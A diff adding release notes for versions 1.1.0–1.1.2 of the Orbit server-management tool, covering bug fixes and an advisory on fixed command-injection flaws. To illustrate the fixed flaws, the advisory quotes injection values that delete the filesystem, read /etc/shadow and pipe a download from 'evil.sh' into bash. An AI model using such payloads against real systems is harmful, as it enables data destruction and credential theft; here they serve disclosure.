@@ -4,6 +4,201 @@ This file contains release notes for all versions of Orbit.
 
 ---
 
+## v1.1.2 - Bug Fixes (2025-11-11)
+
+**Type**: Patch Release (Bug Fixes)  
+**Platform**: Ubuntu 20.04+ / Debian 11+  
+**Architecture**: amd64, arm64
+
+### 🐛 Bug Fixes
+
+**1. handleLogs() - Missing Unit Parameter Validation**
+- **Issue:** API endpoint didn't validate that `unit` parameter was provided
+- **Impact:** Could cause confusing errors when querying logs without specifying a unit
+- **Fix:** Added required parameter validation, returns 400 Bad Request with clear error message
+
+**2. handleLogs() - Lines Parameter Validation**
+- **Issue:** No validation for negative or excessive line count requests
+- **Impact:** Could request negative lines (invalid) or cause DoS with huge numbers (e.g., 999999999)
+- **Fix:** Added range validation (1-10000 lines), invalid values use default (50)
+
+**3. Session Cookie Issue on Reinstall** 🔥
+- **Issue:** After reinstalling Orbit with new config, old session cookies caused authentication errors
+- **Impact:** Users had to manually clear browser cookies to log in after reinstall
+- **User Report:** "при переустановке орбита приходится куки удалять чтобы войти"
+- **Fix:** Gracefully handle invalid session cookies, automatically create new session on decode error
+
+**4. isUserLocked() - Missing Username Validation**
+- **Issue:** Function didn't validate username before running `passwd -S` command
+- **Impact:** Could attempt to check lock status for invalid/malicious usernames
+- **Fix:** Added username validation before executing command
+
+### 📊 Summary
+
+| Category | Found | Fixed |
+|----------|-------|-------|
+| API Validation Bugs | 2 | 2 ✅ |
+| Session Management | 1 | 1 ✅ |
+| User Management | 1 | 1 ✅ |
+| **Total Bugs** | **4** | **4 ✅** |
+
+### ⬆️ Upgrade Instructions
+
+**Via APT (Recommended):**
+```bash
+sudo apt update
+sudo apt upgrade orbitctl
+```
+
+**Via .deb Package:**
+```bash
+wget https://github.com/grosman-net/orbit/releases/download/v1.1.2/orbit_1.1.2_amd64.deb
+sudo dpkg -i orbit_1.1.2_amd64.deb
+```
+
+**Note:** After upgrading, you can now log in immediately without clearing cookies! 🎉
+
+---
+
+## v1.1.1 - Critical Security Fixes (2025-11-11)
+
+**Type**: Security Release (Critical)  
+**Platform**: Ubuntu 20.04+ / Debian 11+  
+**Architecture**: amd64, arm64
+
+### ⚠️ **SECURITY ADVISORY**
+
+This release fixes **3 critical command injection vulnerabilities** and **3 bugs**. **Immediate upgrade is strongly recommended.**
+
+### 🔒 Security Fixes
+
+#### CRITICAL: Command Injection Vulnerabilities (HIGH)
+
+**1. Network & Firewall Operations**
+- **Risk:** Remote code execution via crafted network parameters
+- **Fixed Functions:**
+  - `AllowPort`, `DenyPort`, `DeleteRule` - Firewall management
+  - `SetInterfaceUp/Down` - Interface control
+  - `AddIPAddress`, `DeleteIPAddress` - IP configuration
+  - `AddRoute`, `DeleteRoute` - Routing table
+  - `SaveInterfaceConfig`, `DeleteInterfaceConfig` - Persistent config
+- **Impact:** Malicious input like `"80; rm -rf /"` could execute arbitrary commands
+- **Fix:** Added validation functions (isValidInterfaceName, isValidPort, isValidProtocol, etc.)
+
+**2. Service Operations**
+- **Risk:** Remote code execution via crafted service names
+- **Fixed Functions:** Start, Stop, Restart, Enable, Disable, GetStatus, GetLogs
+- **Impact:** Malicious unit name like `"sshd; cat /etc/shadow"` could leak secrets
+- **Fix:** Added `isValidUnitName()` validation for systemd units
+
+**3. User Management**
+- **Risk:** Remote code execution via crafted usernames
+- **Fixed Functions:** Create, Delete, Lock, Unlock, ChangePassword
+- **Impact:** Malicious username like `"user; curl evil.sh | bash"` could compromise system
+- **Fix:** Added `isValidUsername()` validation following Linux username conventions
+
+#### MEDIUM: Rate Limiting Protection
+- **Issue:** No brute-force protection on login endpoint
+- **Fix:** IP-based rate limiting (5 attempts / 15 minutes)
+- **New File:** `internal/auth/ratelimit.go`
+
+#### LOW: Enhanced Session Security
+- **Issue:** Session secret could be too short if misconfigured
+- **Fix:** Enforced minimum 32-byte session secret with auto-padding
+
+### 🐛 Bug Fixes
+
+**1. services.GetLogs() - Int to String Conversion**
+- **Was:** `string(rune(50))` → "2" (wrong!)
+- **Now:** `fmt.Sprintf("%d", 50)` → "50" (correct!)
+- **Impact:** Service logs now show correct number of lines
+
+**2. users.Create() - Password Not Set**
+- **Issue:** Password never actually set (stdin not piped to chpasswd)
+- **Fix:** Password properly piped via stdin using bytes.Buffer
+- **Impact:** Created users are now usable immediately
+
+**3. handlePackagesUpdate() - Missing Error Handling**
+- **Issue:** JSON decode errors silently ignored
+- **Fix:** Now returns 400 Bad Request on malformed input
+- **Impact:** Better error messages for API consumers
+
+### 📊 Security Audit Summary
+
+| Category | Found | Fixed |
+|----------|-------|-------|
+| Critical Vulnerabilities | 3 | 3 ✅ |
+| Medium Vulnerabilities | 1 | 1 ✅ |
+| Low Vulnerabilities | 1 | 1 ✅ |
+| Bugs | 3 | 3 ✅ |
+| **Total Issues** | **8** | **8 ✅** |
+
+### ⬆️ Upgrade Instructions
+
+**Via APT (Recommended):**
+```bash
+sudo apt update
+sudo apt upgrade orbitctl
+```
+
+**Via .deb Package:**
+```bash
+wget https://github.com/grosman-net/orbit/releases/download/v1.1.1/orbit_1.1.1_amd64.deb
+sudo dpkg -i orbit_1.1.1_amd64.deb
+```
+
+**Via Installer:**
+```bash
+curl -fsSL https://grosman-net.github.io/orbit/install-orbitctl.sh | sudo bash
+```
+
+### 📚 Documentation
+
+- Full audit report: `SECURITY_FIXES_v1.1.1.md`
+- Changelog: `CHANGELOG.md`
+
+---
+
+## v1.1.0 - APT Repository Support (2025-11-10)
+
+**Type**: Minor Release (Feature)  
+**Platform**: Ubuntu 20.04+ / Debian 11+  
+**Architecture**: amd64, arm64
+
+### ✨ What's New
+
+#### 📦 APT Repository Installation
+
+**One-line install:**
+```bash
+curl -fsSL https://grosman-net.github.io/orbit/install-orbitctl.sh | sudo bash
+```
+
+**Or manually:**
+```bash
+echo 'deb [trusted=yes] https://grosman-net.github.io/orbit stable main' | \
+  sudo tee /etc/apt/sources.list.d/orbitctl.list
+sudo apt update
+sudo apt install orbitctl
+```
+
+#### 🎯 Features
+
+- Full APT repository hosted on GitHub Pages
+- Automatic updates via `apt upgrade`
+- Support for amd64 and arm64 architectures
+- Interactive installation (prompts for port and username)
+- Automatic service start after installation
+
+#### 🔧 Technical Details
+
+- Package name: `orbit` (provides: `orbitctl`)
+- APT repository: https://grosman-net.github.io/orbit
+- Debian repository structure: `dists/stable/main/binary-{amd64,arm64}/`
+- Package pool: `pool/main/`
+
+---
+
 ## v1.0.6 - Debian Package Support (2025-11-10)
 
 **Type**: Minor Release (Feature)  
